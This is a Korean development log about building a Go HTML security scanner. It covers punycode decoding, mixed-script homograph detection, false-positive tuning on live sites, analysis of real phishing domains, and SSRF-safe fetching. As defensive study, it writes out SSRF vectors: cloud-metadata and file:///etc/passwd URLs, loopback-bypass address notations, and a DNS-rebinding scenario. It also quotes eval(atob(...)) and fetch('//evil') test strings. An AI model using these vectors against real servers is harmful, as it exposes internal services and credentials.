`unicode.Arabic`·`unicode.Devanagari` 는 **Go 표준 라이브러리의 스크립트 범위표**다. 외부 의존성 0 을 지키면서 정확한 유니코드 판정을 할 수 있다 — Public Suffix List(§12.5)가 표준에 없어 24개만 손으로 들고 있는 것과 대비된다.

**문자열 경계에서는 의심을 유지한다.** 맨 앞·맨 뒤면 `utf8.RuneError` 가 돌아오고, 그 값은 어떤 문자 체계에도 속하지 않아 자동으로 "정당하지 않음"이 된다. 값이 없을 때 안전한 쪽으로 떨어진다.

**한계** — 유니코드의 정식 `Emoji` 속성은 Go 표준에 없어 주요 블록 네 개로 근사했다. 그 범위 밖의 이모지 조합에서는 오탐이 날 수 있다.

| | 위키백과 | 동아일보 | jnu_main |
|---|---:|---:|---:|
| 이전 | 2 | 9 | 4 |
| 이후 | **0** | **6** | **4** |

오탐만 사라지고 진짜 신호는 남았다.

#### 목록은 케이스가 없으면 지켜지지 않는다

결함 주입에서 **인도계 문자 체계를 목록에서 빼도 아무 테스트가 실패하지 않았다.** 데바나가리를 적어놓고 그걸 지키는 케이스가 없었던 것이다. 힌디어 ZWNJ 케이스를 넣고서야 목록이 지켜졌다. 34교시 이후 반복되는 패턴이다.

### 12.19 punycode 디코더 — 표준에 없으면 직접 만든다

혼합 스크립트 판정을 하려면 `xn--pple-43d` 를 `аpple` 로 되돌려야 한다. `golang.org/x/net/idna` 를 쓰면 되지만 **외부 의존성 0** 원칙이 깨진다. RFC 3492 디코더를 직접 만들었다(112줄).

**검증은 독립 구현과 대조했다.** 파이썬 표준 라이브러리의 punycode 디코더와 8개 벡터가 전부 일치했다. 그중 `人名辞典`·`渋谷駅` 는 인위적 예제가 아니라 **측정 단계에서 `日本語.jp` 에서 실제로 뽑은 도메인**이다.

#### 퍼징이 찾은 것은 코드가 아니라 내가 세운 성질이었다

첫 퍼즈가 17초 만에 실패했다 — "출력 1025글자". 성질을 **1024라는 임의의 상수**로 적었기 때문이다. punycode 의 진짜 성질은 이것이다.

> 글자 하나마다 인코딩 문자를 최소 하나 쓴다 → **출력 글자 수 ≤ 입력 길이**

§8.2 `FuzzUnescape` 의 "출력이 입력보다 길어질 수 없다"와 같은 꼴이다. 성질을 고치니 **1,467만 실행**이 무결로 통과했다.

**퍼징은 코드만 시험하지 않는다. 내가 세운 성질도 함께 시험한다.**

#### 옮겨 적다 생긴 결함 둘 — 증상이 원인을 갈랐다

| 잘못 | 증상 |
|---|---|
| `w += punyBase - t` (곱셈이어야 함) | `münchen` → `mnchÿen` — **글자만 틀림** |
| 서로게이트 시작을 `0x0800` (`0xD800` 이어야 함) | `한국`·`人名辞典` → **아예 false** |

키릴 문자(U+0400대)는 `0x0800` 미만이라 둘째 결함을 통과했고, 그래서 첫째 증상만 보였다. **두 결함이 겹쳐 있어도 입력에 따라 다르게 나타나 갈라낼 수 있었다.** 둘 다 컴파일러와 `go vet` 을 통과하며, `mnchÿen` 처럼 **결과가 그럴듯해서** 벡터 없이는 넘어간다.

#### 원본은 어떻게 했는가 — 브랜드 목록

원본 `HtmlScannerHelper.cpp` 는 libidn2 를 쓰고, 판정은 이렇다.

```cpp
if (asciiDomain.find("xn--") == npos) return false;   // ① punycode 인가
for (brand : {"paypal","google","apple",…,"lg"})      // ② 브랜드 이름이 들어 있나
    if (lowerDomain.find(brand) != npos) return true;
```

재현해 보니 **판정이 거꾸로였다.**

| 도메인 | 원본 판정 | |
|---|---|---|
| `аpple.com` (키릴 а) | 통과 | 전형적 호모그래프 — **미탐** |
| `xn--pple-43d.com` | 통과 | 같은 도메인의 ASCII 표기 — **미탐** |
| `gοogle.com` (그리스 ο) | 통과 | **미탐** |
| `xn--lg-9k1c.com` | 의심 | 정상 IDN — **오탐** |

호모그래프의 본질은 **"브랜드 이름과 눈으로는 같지만 바이트로는 다른 문자열"** 인데, 브랜드 이름을 **바이트로 찾고 있다.** 공격이 성공할수록 탐지에서 멀어진다. 반대로 `lg` 같은 두 글자 브랜드는 우연히 걸린다. 원본은 `ToUnicode` 디코딩 함수를 **가지고 있으면서 판정에 쓰지 않았다** — 도구는 있는데 무엇을 물어야 하는지가 정해지지 않았다.

§9.5 에서 "키워드 목록"으로 분류해 버린 유형이다. `H803` 의 `'c2'` 가 UUID 에 걸리던 것과 같은 결함인데, 이번엔 **미탐 방향으로도** 실패한다는 것이 드러났다.

> 목록은 "무엇이 나쁜지"를 열거하고, 성질은 "무엇이 이상한지"를 정의한다. **목록은 공격자가 목록 밖으로 나가면 끝난다.**

### 12.20 혼합 스크립트 — 브랜드를 모르고도 잡는다

§12.19 의 디코더 위에 규칙을 얹었다. 판정 범위는 **실제 글자를 놓고** 정했다.

| 문자 체계 쌍 | 구별 |
|---|---|
| 라틴 `a` / 키릴 `а` · 라틴 `o` / 그리스 `ο` · 라틴 `p` / 키릴 `р` | **불가** — 같은 모양 |
| 라틴 / 한글 `아` · 한자 `日` · 아랍 `ا` | 명확 |

그래서 **라틴·키릴·그리스 중 둘 이상이 한 라벨에 섞였는가**만 본다. 한글·한자는 혼동 대상이 아니고, 일본어 도메인은 한자와 가나를 정상적으로 섞어 쓴다(§12.19 의 `人名辞典.jp`).

```
аpple.com   → 라벨 "аpple" = {라틴, 키릴}   → 의심
한국.kr      → {한글}                        → 통과
日本語.jp     → {한자}                        → 통과
münchen.de  → {라틴}  (ü 도 라틴이다)         → 통과
пример.рф   → {키릴}                         → 통과
```

**브랜드 목록이 없다.** `apple` 도 `google` 도 모르면서 잡는다 — §12.19 의 원본과 정확히 반대 방향이다.

#### 심각도 HIGH

혼합 스크립트 호스트는 **오타로 생기지 않는다.** 도메인은 한 글자씩 손으로 치는 게 아니라 등록해서 복사해 쓴다. 정상 용도가 없고, 코퍼스 17쪽·호스트 704개에서 0건이었다. `base-href-external` 과 같은 성격(origin)으로 봤다. `noscript-breakout` 을 MEDIUM 으로 둔 것과 대비된다 — 그건 오타로도 같은 모양이 생긴다(§12.13).

#### 잡지 못하는 것

```
аррӏе.com   ← 전부 키릴로 만든 "apple". 섞이지 않았으므로 통과시킨다
```

한 문자 체계로만 만든 위조(whole-script confusable)는 **글자 대응표**가 있어야 잡는다. 한계로 기록한다. 다만 모든 글자에 대응 문자가 있어야 하므로 공격자가 쓰기 더 어렵다.

#### 오타 두 번, 증상은 같았다

| 교시 | 오타 위치 | 증상 |
|---|---|---|
| 24 | 구현의 `"iframe-snadbox-escape"` | 음성 통과 + 양성 전부 0건 |
| 41 | **테스트의** `const code = "mixed-scirpt-host"` | 같음 |

방향이 반대인데 증상이 똑같다. **양쪽 문자열이 만나지 못하면 규칙은 없는 것과 같다.**

진단 과정에서 **내 도구가 또 틀렸다.** `sed -n '/var confusableScripts/,/^}/p'` 가 `}{` 줄을 범위 끝으로 오인해 "목록이 비었다"고 잘못 단언했다(다섯 번째 측정 도구 함정). 결국 `ScanURL` 을 직접 불러 값을 찍어 보고서야 "규칙은 되는데 테스트만 못 찾는다"로 좁혀졌다.

> 코드를 읽어 추측하지 말고 한 단계씩 실행해 값을 찍는다. **진단 도구 자체가 틀릴 수 있다.**

### 12.21 실전 43개 사이트 — 규칙 23종을 한 번에 재다

41교시까지 규칙을 쌓았지만 **도구를 실제로 써본 적이 없었다.** 스캔한 실제 페이지는 코퍼스 17쪽이 전부였고, 규칙 23종 중 **5종만** 거기서 발동했다. 나머지 18종은 "안 나오는 게 목표"와 "아직 안 만나본 것"이 섞여 있었다.

한국·일본·중국·러시아·유럽·인도·아랍의 뉴스·포털·정부·교육·기술 사이트 50개를 받아 **43개**(27MB)를 스캔했다.

```
HIGH 0건            오탐 없음
스캔 0.89초          27MB · 43쪽
발견 393건          그중 257건이 javascript-url
```

세 가지 문제가 한꺼번에 드러났다. **코퍼스 17쪽에서는 하나도 보이지 않던 것들이다.**

#### ① `javascript-url` — 집계가 없어 리포트가 무너진다

```
kr_melon  243건   javascript:melon.link.goArtist(…) ×158 · goAlbumDetail(…) ×38 · playSong(…) ×20
```

오탐이 아니다. 실제로 쓰고 있다. 하지만 같은 함수가 158번 반복되고, **그 243건의 조치는 하나**다. §12.6 의 집계 원칙이 이 규칙에는 빠져 있었다.

다만 전부 묶으면 안 된다. 43개 사이트에서 **문자 참조로 가린 형태는 0건**이었다 — 그건 필터를 피하려는 흔적이라 흔한 쪽에 묻히면 안 된다. 그래서 키를 **평문 / 우회** 둘로 나눴다.

#### ② `zero-width` — 조판 문자를 난독화로 봤다

```
yandex        +17[WJ]…[WJ]+29[WJ]°      숫자·기호 경계
guardian      reportedly [WJ]poised      공백 뒤
kaist         …혁신 가속[ZWSP]            텍스트 끝
timesofindia  Trailer[ZWSP][ZWSP]×50     제로폭끼리 연속
```

**U+2060 WORD JOINER 는 "여기서 줄바꿈하지 마라", ZWSP 는 "여기서 줄바꿈해도 된다"는 정상 문자다.** §12.18 은 ZWNJ·ZWJ 를 문자 체계로 갈랐지만, 이 둘은 어느 언어에서나 조판용이라 그 기준이 통하지 않는다.

전체 296개 제로폭 문자를 조사하니 **글자 사이에 낀 것은 72개, 전부 ZWNJ/아랍 문자**(이미 통과시키는 경우)였다. 나머지 224개는 모두 경계에 있었다.

> 난독화는 **단어를 쪼개야** 효과가 있다. `pay[ZWSP]pal` 은 필터를 피하지만 문장 끝의 ZWSP 는 아무것도 피하지 못한다.

BOM(U+FEFF)만 예외로 뒀다 — 문서 중간에서는 조판 용도가 없다. 그리고 제로폭을 **둘 이상 잇달아** 넣어 판정을 피하지 못하도록, 앞뒤 글자를 찾을 때 제로폭을 건너뛴다.

#### ③ `obfuscated-eval` — 같은 파일에 있을 뿐이었다

```js
eval("/"+name+"=([^;]+)/").exec(document.cookie)   // 정규식을 eval 로 생성 (옛 기법)
eval("require")(path.join(__dirname, …))            // webpack 이 만든 코드
```

둘 다 정상 코드다. 규칙이 "같은 스크립트 안에 `eval(` 과 디코더가 있으면"이었는데, 수만 줄 번들에서는 둘이 아무 관계 없이 공존한다. 거리로 좁히는 방법은 §9.3 에서 버린 **임계값**이다. 대신 **구조**를 봤다.

> `eval` 과 디코더가 같은 파일에 있다 → 아무 뜻도 아니다
> **디코더의 결과가 `eval` 의 인자로 들어간다** → 그게 난독화다

괄호 균형으로 `eval(` 의 인자 범위를 구하고 그 안만 본다. 문자열 속 괄호는 세지 않는 근사라 **균형이 안 맞으면 판정하지 않는다** — 실패 방향이 미탐이라 안전하다.

**못 잡게 된 것을 테스트에 적었다.**

```go
{"변수 경유는 놓친다", `<script>var d=atob(x);eval(d)</script>`, 0},
```

기대값 0 이 "알고서 받아들인 한계"임을 못 박는다. 넓히려면 변수 추적이 필요한데 그건 §13 의 taint 영역이다.

#### 결과

| 실전 43개 사이트 | 이전 | 이후 |
|---|---:|---:|
| 전체 발견 | 393 | **115** (−71%) |
| melon 한 페이지 | 247 | **5** |
| `zero-width` | 23 | **0** |
| `obfuscated-eval` | 2 | **0** |
| HIGH | 0 | **0** |

#### 집계의 대가

`javascript-url` 이 집계 규칙이 되면서 **주입 테스트에서 빠졌다.** 집계 규칙은 페이지의 첫 위치를 가리키는데 주입 조각은 끝에 있으니 구간 판정이 성립하지 않는다(§12.11). `inline-handler`·`target-blank-no-rel` 에 이어 세 번째다.

> 읽기 좋은 리포트와 위치 기반 검증은 맞바꾸는 관계다. **대가를 아는 채로 고른다.**

#### 결함 주입이 또 케이스의 빈틈을 드러냈다

| 지운 것 | 처음 결과 | 추가한 케이스 |
|---|---|---|
| 우회 제목 구분 | 아무 테스트도 실패 안 함 | 제목을 단언하는 테스트 |
| 괄호 균형(`depth++`) | 아무 테스트도 실패 안 함 | `eval(g() + atob(x))` |

`eval(atob(x))` 는 첫 괄호 안에 이미 디코더가 있어서 균형이 필요 없었다. **장치가 실제로 필요한 입력**을 넣고서야 지켜진다. 34·39교시에 이어 네 번째다.

### 12.22 코퍼스와 실전 측정을 나눈다

§12.21 의 43개 페이지(27MB)를 코퍼스에 넣을지 물었다. **넣지 않기로 했다.** 둘은 역할이 다르다.

| | 코퍼스 `testdata/corpus/` | 실전 측정 `tools/` |
|---|---|---|
| 역할 | **회귀 방어** — 오늘 고친 게 내일 깨지지 않게 | **새 오탐 발견** |
| 표본 | 작고 다양함, **변하지 않음** | 크고 최신, 매번 새로 |
| 저장 | git 에 커밋 | **커밋하지 않음**(`/testdata/live/`) |
| 실행 | `go test` | 사람이 필요할 때 |

27MB 를 커밋하면 테스트가 15초로 늘고, **커밋된 사본은 낡아간다.** 목록과 스크립트만 두면 언제든 그날의 웹에 댈 수 있다.

#### `tools/measure.sh` — 측정을 절차로

오늘 쓴 스크립트가 스크래치패드에만 있으면 다음에 또 만들어야 한다(그리고 같은 함정을 다시 밟는다). §12.11 에서 주입 측정을 영구 테스트로 만든 것과 같은 논리인데, 이건 네트워크가 필요하니 **테스트가 아니라 도구**다.

스크립트에는 이번에 겪은 함정이 그대로 들어 있다.

| 장치 | 왜 |
|---|---|
| `#!/usr/bin/env bash` | **zsh 는 따옴표 없는 변수를 공백으로 쪼개지 않는다** — 두 번 당했다 |
| `export -f fetch` | zsh 는 함수를 export 하지 못해 병렬 수집이 안 된다 |
| `set -u` 만, `set -e` 없음 | 스캐너는 **발견이 있으면 1 로 끝난다** — `set -e` 면 첫 발견에서 죽는다 |
| 2000바이트 미만 건너뛰기 | 403 차단 페이지도 **받아지긴 한다** |
| `${name}\t` 중괄호 | 한글이 뒤에 붙으면 변수명이 이어져 `unbound variable` 이 난다 |

이미 받은 페이지는 다시 받지 않아 **두 번째 실행이 0.75초**다. 규칙을 고치고 곧바로 같은 표본에 다시 댈 수 있다.

**같은 도구, 다른 시점** — 하루 차이로 `sri-missing` 이 69→70 이 됐다. 커밋된 코퍼스는 변하지 않고 실전 측정은 그날의 웹을 본다. 둘을 나눈 이유가 이것이다.

#### 코퍼스는 선별해서 넷만

지금 코퍼스에 없던 **문자 체계**를 기준으로 골랐다. 크기만 크고 같은 것을 지키는 페이지(`de_spiegel` 1.9MB, `us_cnn` 5.6MB)는 뺐다.

| 추가 | 크기 | 의도 |
|---|---:|---|
| `livedoor.html` | 61KB | 일본어(한자+가나) |
| `lenta.html` | 134KB | 키릴 |
| `wikipedia_hi.html` | 307KB | 데바나가리 |
| `wikipedia_ar.html` | 620KB | 아랍 |

**넷 다 0건이거나 참인 발견**이라 넣는 순간 새 오탐은 없다. 대신 앞으로 규칙을 고칠 때 이 문자 체계에서 깨지면 즉시 실패한다.

#### 측정이 의도를 정정했다

넣고 나서 "이 페이지들이 실제로 무엇을 지키는가"를 결함 주입으로 쟀다.

| 지운 것 | 실패한 코퍼스 |
|---|---|
| `unicode.Arabic` | `wikipedia_ko` · `wikipedia_hi` · `wikipedia_ar` |
| `unicode.Devanagari` | **없음** |

`wikipedia_hi` 의 ZWNJ 12개는 **데바나가리가 아니라 아랍 문자 사이**에 있었다 — 사이드바의 페르시아어 링크다. 데바나가리 글자가 46,379개인데 그 사이에 ZWNJ 는 없다.

> 인도계 문자 체계를 지키는 것은 **39교시의 힌디어 단위 테스트뿐**이다. 아랍은 세 페이지가 중복으로 지킨다.

넣기 전에 세운 의도("데바나가리 ZWNJ 를 지킨다")가 틀렸다. 이 페이지들의 실제 역할은 **아랍·데바나가리 본문에서 다른 규칙들이 오탐하지 않는지**를 고정하는 것이다. 의도와 실제가 다를 때는 실제를 적는다.

### 12.23 실제 피싱 도메인 918개 — 규칙의 한계를 재다

C-TAS(사이버위협정보 분석공유시스템)의 차단 목록을 받았다. **접속하지 않고 도메인 문자열만** 분석했다.

| 파일 | 내용 |
|---|---|
| `202609_block_ip_level2_*.json` | IP **1,949개** (악성코드 유포지 1,780 · 피싱 163) |
| `202609_block_domain_level2_*.json` | 도메인 **918개** (피싱 896 · 사칭 대상 NETFLIX 68 · 페이스북 61) |

IP 목록은 HTML 표본으로 쓸 수 없다 — 피싱은 도메인 기반 가상호스팅이라 **IP 로 직접 치면 서버 기본 페이지**가 나온다. 그리고 1,780개가 악성코드 유포지라 받아지는 건 HTML 이 아니라 페이로드다.

#### 실측 — `mixed-script-host` 가 0개를 잡았다

도메인 918개 중 punycode 는 **63개(6%)**. 그 라벨을 디코딩했더니 **문자 체계가 전부 한글 단일**이었다.

```
등기수령서비스.com        ← xn--ok0b21kb0c2qi8zdfvbd2a.com
법원등기간편검색.com       ← xn--s39a6is8bu2nojkukgqwlk4z.com
온라인민원창구365.com      ← xn--365-ht8lp61brrg08sqhbf5b6xz.com
본인확인.me              ← xn--sn3b25qa333m.me
```

| §12.20 규칙 | |
|---|---|
| 정상 IDN 오탐 | **0건** |
| `аpple.com` 류 호모그래프 | 잡는다 |
| **실제 한국 피싱 63개** | **0건 — 전부 미탐** |

**실제 한국 대상 피싱은 호모그래프를 쓰지 않는다.** 라틴에 키릴 `а` 를 섞는 대신 **한글 도메인으로 그럴듯한 이름**을 만든다. 문자 체계가 섞인 게 아니라 **의미로 속이는 것**이라, 문자 체계 판정으로는 원리적으로 못 잡는다.

규칙이 틀린 건 아니다. **그 지역의 실제 공격 양상과 맞지 않을 뿐이다.** 도메인 문자열만으로 `등기수령서비스.com` 을 악성으로 판정하려면 의미 판단이 필요한데, 그건 §9.5 에서 버린 브랜드·키워드 목록의 길이다.

> 도메인 이름이 아니라 **페이지의 행위**를 보면 잡힌다 — 로그인 폼이 외부로 가면 `cross-origin-password-form`, 평문이면 `cleartext-credentials`. **그래서 HTML 표본이 필요하다.**

#### HTML 표본을 안전하게 얻는 길

| 경로 | 실측 |
|---|---|
| C-TAS 도메인 → urlscan.io 검색 | **0/10** 기록 없음 (한국 대상이라 국제 서비스에 안 올라온다) |
| urlscan `tags:phishing` 검색 | **403** — 무료 API 키가 필요하다 |
| 악성 도메인에 직접 접속 | **하지 않는다** |

urlscan.io 는 **그들이 이미 방문해 저장한 DOM** 을 돌려준다. 우리는 urlscan 에만 접속하므로 악성 인프라와 통신이 없다. 직접 접속은 차단 목록 시점이라 상당수가 죽었고, 살아있는 것에 접속하면 우리 IP 가 공격자 로그에 남는다 — **얻을 것보다 잃을 것이 크다.**

### 12.24 도구에서 서비스로 — 위협 모델이 바뀐다

다음 목표는 **웹 페이지에서 URL 을 입력받아 가져와 스캔하고 결과를 보여주는 것**이다. 그 순간 위협 모델이 뒤집힌다.

> 지금까지: 내가 악성 사이트를 조사한다
> 앞으로: **임의의 사용자가 임의의 URL 을 우리 서버에 넣는다**

**1순위 위험은 악성 사이트가 아니라 SSRF 다.**

```
http://169.254.169.254/...   클라우드 메타데이터 → 자격증명이 스캔 결과로 출력된다
http://127.0.0.1:6379/       내부 서비스
file:///etc/passwd           로컬 파일
```

| 위험 | VM | VPN | 실제로 필요한 것 |
|---|:---:|:---:|---|
| SSRF | ❌ | ❌ | **주소 검증(코드)** |
| 우리 IP 노출 | ❌ | ✅ | VPN/프록시 |
| 파서 취약점 → 호스트 침해 | ✅ | ❌ | VM/컨테이너 |
| 결과 페이지의 **저장형 XSS** | ❌ | ❌ | **출력 이스케이프(코드)** |
| 리소스 고갈 | 일부 | ❌ | 크기·시간 제한(코드) |

**절반이 코드 문제다. 인프라로는 안 막힌다.** VM 안에서도 `169.254.169.254` 는 그 VM 의 메타데이터를 돌려주고, 목적지가 사설 IP 면 VPN 을 타지도 않는다.

특히 우리 것: **`Evidence` 에 원본 마크업이 그대로 들어 있다**(`<img onerror=…>`). 이스케이프 없이 렌더링하면 **우리가 만든 스캐너가 우리 사이트에 XSS 를 심는다.** 보안 도구가 실제로 저지르는 실수다.

가장 흔한 함정은 **DNS 재바인딩**이다. 검증할 때는 공개 IP, 접속할 때는 `127.0.0.1` 이 되도록 TTL 0 으로 바꿔둔다. 그래서 **검증한 IP 로 직접 접속하고 `Host` 헤더만 도메인으로** 줘야 한다(`http.Transport.DialContext`).

순서는 **코드가 먼저**다 — ① SSRF 방어 `fetcher` → ② 출력 이스케이프 → ③ 웹 계층 → ④ 격리 운영.

---

### 12.25 이름이 아니라 주소를 본다 (47교시)

SSRF 를 URL 문자열에서 막으려는 시도는 **원리적으로 진다.**

```
http://127.1/              http://0177.0.0.1/     http://2130706433/
http://0x7f000001/         http://[::ffff:127.0.0.1]/
http://localtest.me/       ← 정상 도메인. A레코드가 127.0.0.1 일 뿐이다.
```

마지막 줄에서 끝난다. 문자열에는 아무 이상이 없다. 정상 도메인, 정상 DNS 응답, 목적지만 우리 서버 안이다.

이건 이 프로젝트가 계속 다뤄온 **Parser Differential 과 같은 모양**이다.

| | 우리가 본 것 | 진짜 일어나는 것 |
|---|---|---|
| Parser Differential | 우리가 파싱한 HTML | 브라우저가 파싱한 HTML |
| SSRF | 우리가 검사한 문자열 | 커널이 접속한 주소 |

둘 다 **검사 대상과 실행 대상이 어긋나서** 생긴다. 해법도 같다 — **실행 대상을 검사한다.**

좋은 소식: `netip.ParseAddr` 은 위 우회 표기를 **전부 거부**한다(`127.1` → `IPv4 address too short`, `0177.0.0.1` → `octet with leading zero`). 우리가 파싱하지 않고 **해석기가 돌려준 값만 받으면** 표기 장난은 우리 층에 도달조차 못 한다.

**표준 라이브러리를 믿기 전에 33개 벡터로 쟀다.** 구멍이 둘 있었다.

**① `IsGlobalUnicast()` 는 "공인 주소"라는 뜻이 아니다.**

```
10.0.0.1  192.168.0.1  fc00::1  100.64.0.1  240.0.0.1   → 전부 true
255.255.255.255                                          → false (얘만 특별 취급)
```

이름만 보고 `if IsGlobalUnicast() { 허용 }` 이라고 쓰면 **사설망이 통째로 열린다.**

**② IPv6 로 IPv4 를 감싸는 경로를 모른다.**

```
::ffff:127.0.0.1   IsLoopback()=true    ← 이건 안다
::127.0.0.1        IsLoopback()=false   IsGlobalUnicast()=true   IPv4-호환(폐기)
64:ff9b::7f00:1    IsLoopback()=false   IsGlobalUnicast()=true   NAT64
2002:7f00:1::      IsLoopback()=false   IsGlobalUnicast()=true   6to4
2001:0:7f00:1::    IsLoopback()=false   IsGlobalUnicast()=true   Teredo
```

넷 다 **127.0.0.1 로 간다.** 네트워크가 NAT64/6to4 를 쓰면 실제로 루프백에 닿는다.

그래서 `blockedReason(netip.Addr) string` 은 세 층이다 — 표준 함수(루프백·사설·링크로컬·멀티캐스트·미지정) → `!IsGlobalUnicast()` 그물 → **표준 함수가 놓치는 8대역 표**. `bool` 이 아니라 **이유 문자열**을 돌려준다. 이 프로젝트의 규칙과 같다: 판정에는 증거가 따라붙는다. 이 값이 그대로 웹 페이지에 나간다.

**내가 틀린 곳**: 처음 표에 `240.0.0.0/4` 가 없었다. `255.255.255.255` 가 걸러지길래 예약 대역 전체가 걸러진다고 넘겨짚었다. 벡터를 돌리니 `240.0.0.1` 한 줄이 통과했다. **표준 라이브러리 동작은 추론하는 게 아니라 재는 것이다.**

### 12.26 검증과 사용 사이에 틈을 두지 않는다 — TOCTOU (48교시)

주소 판정 함수가 있어도 **이렇게 쓰면 아무 소용이 없다.**

```go
ips, _ := net.DefaultResolver.LookupNetIP(ctx, "ip", host)   // ① 이름을 푼다
for _, ip := range ips { if blockedReason(ip) != "" { ... } } // ② 검증한다
resp, err := http.Get(url)                                    // ③ 이름을 다시 푼다!
```

공격자가 TTL=0 DNS 서버를 운영하면 ①과 ③의 답이 다르다.

```
① attacker.com → 93.184.216.34   (검증 통과)
③ attacker.com → 127.0.0.1        (같은 이름, 다른 답)
```

**DNS 재바인딩**이고, 일반화하면 **TOCTOU**(Time Of Check to Time Of Use)다. 해법은 검증을 세게 하는 게 아니라 **틈을 없애는 것**이다.

```
잘못:  풀기 → 검증 → [틈] → 다시 풀기 → 접속
맞음:  풀기 → 검증 → 검증한 그 주소로 접속
```

Go 에서 그 자리는 **`http.Transport.DialContext`** 다. 실제 TCP 연결 직전에 불리고, 우리가 돌려준 연결을 그대로 쓴다. **TLS 는 안전하다** — `DialContext` 는 맨 TCP 만 돌려주고 인증서 검증과 SNI 는 `Transport` 가 **URL 의 도메인 이름**으로 한다. IP 로 접속하면서 이름으로 검증하는, 정확히 원하는 동작이다. (`DialTLSContext` 를 쓰면 깨진다.)

**리다이렉트는 공짜로 막힌다 — 하지만 이유를 내가 틀리게 적었다.** 처음에 "홉마다 `DialContext` 가 불려서"라고 썼는데, 재 보니 **같은 호스트로 가는 리다이렉트는 연결을 재사용해 `DialContext` 가 안 불린다**(10홉 고리에서 dial 1회). 안전한 진짜 이유는 **연결마다 검증**이기 때문이다 — 새 연결이면 새로 검증하고, 재사용이면 이미 검증한 IP 에 그대로 머문다. 어느 쪽도 미검증 주소에 닿지 않는다. 측정으로 확인했다: 공인 IP 에서 `169.254.169.254` 로 리다이렉트하면 2홉째에서 막힌다.

**답이 여럿이고 하나라도 내부면 이름 전체를 거부한다.** "공인 주소만 골라 쓰자"가 관대해 보이지만, 재시도마다 DNS 가 다른 순서·다른 답을 줘서 결국 같은 경주가 된다.

**이음매를 "보안 끄는 스위치"로 만들지 않았다.** `guard` 필드를 두고 테스트에서 검증을 꺼버리는 설계도 가능했지만, 그러면 테스트가 증명하는 게 없어진다. 대신 `lookup`(이름 풀기)·`dial`(연결 맺기) 두 자리에 뒀다. 덕분에 테스트가 *"우리가 검증한 바로 그 주소로 나갔는가"* 를 직접 단언한다. 둘 다 `nil` 이면 진짜 네트워크 — **깜빡하면 안전한 쪽으로 떨어진다.**

**변이 검사 26/26이 세 가지를 가르쳤다.**

**① `Unmap()` 을 빼도 테스트가 통과했다 — 죽은 코드가 아니라 진짜 우회였다.**

`netip.Prefix.Contains()` 는 주소 종류가 다르면 그냥 `false` 를 돌려준다. 알아서 unmap 해주지 않는다.

```
100.64.0.0/10 .Contains( ::ffff:100.64.0.1 ) = false   ← 4바이트 prefix vs 16바이트 addr
```

그래서 `Unmap()` 이 없으면 **표가 담당하는 4대역이 `::ffff:` 로 감싸면 전부 뚫린다.** 테스트가 못 잡은 이유: 내가 넣은 `::ffff:` 벡터 셋은 전부 **표준 함수가 담당하는 대역**이었다(표준 함수는 4-in-6 을 알아서 처리한다). **표가 담당하는 대역에는 4-in-6 벡터가 하나도 없었다.** 테스트의 구멍과 방어의 구멍은 보통 같은 자리다.

**② 거부 테스트는 "거부됐다"만 봐서는 부족하다.**

`blockedReason` 을 무력화하니 테스트가 **멈췄다** — 진짜로 `169.254.169.254:80` 에 SYN 을 보내고 응답을 기다린 것이다. 테스트가 *"오류가 났다"* 만 봤기 때문에 **오류가 나기까지 네트워크로 나갔다는 사실**을 못 봤다. → `mustNotDial(t)` 를 끼워 "나가지 않았다"도 단언한다. **방어가 깨졌을 때 테스트가 조용히 밖으로 나가면 안 된다.**

**③ "우리가 막았다"와 "어쩌다 막혔다"는 다르다.**

| 우리 코드를 지웠을 때 | 실제로 일어난 일 |
|---|---|
| scheme 검사 | `net/http` 가 `unsupported protocol scheme` 으로 거절 |
| 빈 응답 검사 | `net/http` 가 `Transport.DialContext hook returned (nil, nil)` 으로 거절 |

둘 다 오류는 났고, 그래서 테스트가 통과했다. 하지만 막은 건 우리가 아니라 표준 라이브러리다. 다음 버전에서 동작이 바뀌면 조용히 뚫린다. → 단언을 *"오류가 났나"* 에서 *"**우리** 메시지가 났나"* 로 바꿨다.

같은 맥락에서 **아무것도 지키지 않는 단언 한 줄**도 찾아 지웠다. `http.Client.Do` 는 실패를 `*url.Error` 로 감싸며 URL 을 자동으로 덧붙이므로, 오류에 host 가 담겼는지 보는 단언은 우리 코드와 무관하게 통과한다. **통과하는데 아무것도 증명하지 않는 단언**이었다.

---

### 12.27 상대가 통제하는 값에는 상한을 둔다 (49교시)

48교시는 **어디로 나가는가**였다. 연결이 성사된 뒤에는 세 가지를 **상대가 정한다** — 응답이 언제 끝나는지, 얼마나 큰지, 몇 번 돌리는지.

수집기를 재봤다.

| 재 본 것 | 결과 |
|---|---|
| 3초 지연 서버 | **3.002초 기다림, 오류 없음** — 상한 없음 |
| 거대 응답 | 상한 없음 |
| 무한 리다이렉트 | 10회에서 멈춤 — **Go 기본값**이 막음 |
| `file://` 로 리다이렉트 | `unsupported protocol scheme` — **net/http** 가 막음 |

아래 둘은 막히긴 했다. 하지만 §12.26에서 세운 기준 그대로다 — **"우리가 막았다"와 "어쩌다 막혔다"는 다르다.** 넷 다 우리 것으로 가져왔다.

**조용한 절단 — 크기 제한이 미탐을 만든다.**

흔히 이렇게 쓴다.

```go
body, _ := io.ReadAll(io.LimitReader(r, max))   // 함정
```

`max = 20` 으로 재봤다.

```
원본 41바이트   "<p>ok</p><script>fetch('//evil')</script>"
결과 20바이트   "<p>ok</p><script>fet"          오류 없음
```

`<script>` 가 한가운데서 잘렸고 아무도 모른다. `io.LimitReader(r, max)` 로는 *"정확히 max 였다"* 와 *"max 를 넘어서 잘렸다"* 를 **구별할 수 없다** — 둘 다 max 바이트를 돌려주고 `io.EOF` 도 없다.

스캐너가 이 반쪽 문서를 받으면 **"깨끗함"이라고 보고한다. 우리 방어가 우리 미탐을 만든다.** 이 프로젝트가 처음부터 가장 경계해 온 방향이다.

해법은 **한 바이트 더 읽는 것**이다. `max+1` 을 읽어서 `max+1` 바이트가 오면 넘친 것이다.

**상한은 `0` 이면 기본값**(10초 · 5MB · 3홉)으로 떨어진다. 설정을 깜빡하면 무제한이 아니라 안전한 쪽이다 — 이음매의 `nil` 과 같은 원리다. 상한은 대문자(진짜 설정), 이음매는 소문자(테스트 장치)로 나눴다.

**`Get` 은 `*Page{URL, Body}` 를 돌려주고 `URL` 은 최종 주소다**(`resp.Request.URL`). 스캐너의 `Context.Domain` 은 **반드시 이 값**을 써야 한다. 요청한 URL 로 판정하면 `mybank.com` → `evil.com` 리다이렉트에서 `evil.com` 의 로그인 폼을 같은 출처로 본다. `Jar` 를 주지 않아 쿠키는 저장하지도 보내지도 않는다.

**변이 검사 37/37 (addr.go 18 + fetch.go 19), 커버리지 90.7%.** 둘을 배웠다.

